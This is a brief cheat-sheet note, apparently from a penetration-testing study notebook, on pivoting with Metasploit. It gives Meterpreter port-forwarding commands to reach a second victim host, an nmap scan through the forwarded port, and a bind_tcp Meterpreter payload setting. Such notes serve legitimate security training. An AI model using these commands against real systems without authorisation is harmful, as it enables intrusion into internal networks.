Another source for more info: [[Pivoting using Metasploit]]

**Port Forwarding**
`sessions 1`
`portfwd add -l <your LOCAL_PORT> -p <TARGET2_PORT> -r <TARGET2_IP>`
EX:
`portfwd add -l 1234 -p 80 -r <victim-2_ip>`

`background`
`db_nmap -sS -sV -p <your LOCAL_PORT> localhost`



After port fording we use `bind paylod`
```
set payload windows/meterpreter/bind_tcp
```
